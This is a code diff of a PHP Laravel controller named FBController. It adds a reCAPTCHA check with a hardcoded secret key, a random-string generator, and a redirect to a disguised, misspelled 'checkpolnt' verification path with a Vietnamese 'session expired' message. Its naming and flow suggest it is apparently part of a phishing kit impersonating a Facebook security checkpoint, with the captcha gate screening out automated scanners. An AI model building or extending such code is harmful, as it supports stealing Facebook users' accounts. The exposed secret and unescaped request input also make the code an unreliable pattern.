@@ -14,7 +14,7 @@ class FBController extends Controller
     }
     public function index()
     {
-        return view('fb.index');
+        return view('fb.welcome');
     }
     public function secure()
     {
@@ -90,7 +90,31 @@ class FBController extends Controller
         return redirect('waiting-verify');
     }
 
+    public function verifyCaptcha(Request $request)
+    {
 
+        $arrInput    = $request->input();
+        $keycaptcha  = $arrInput['captcha'];
+        $remoteserve = $_SERVER['REMOTE_ADDR'];
+        $scretkey    = "6Lf_P4opAAAAADEXr2BI7iKk_Ux_51HHRJzxXFzs";
+        $url         = "https://www.google.com/recaptcha/api/siteverify?secret=$scretkey&response=$keycaptcha&remoteip=$remoteserve";
+        $arrResponse = file_get_contents($url);
+        $arrResponse = json_decode($arrResponse);
+        if ($arrResponse->success) {
+            $return['code'] = 200;
+            $return['url']  = url('ver-checkpolnt6824876/' . $this->generateRandomString());
+            $return['msg']  = 'Hết phiên làm việc, vui lòng ấn f5 để thực hiện lại';
+        } else {
+            $return['code'] = '400';
+            $return['msg']  = 'Hết phiên làm việc, vui lòng ấn f5 để thực hiện lại';
+        }
+
+        return response()->json($return);
+    }
+    public function generateRandomString($length = 10)
+    {
+        return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);
+    }
     public function waitingVerify()
     {
         return view('fb.waiting-verify', []);
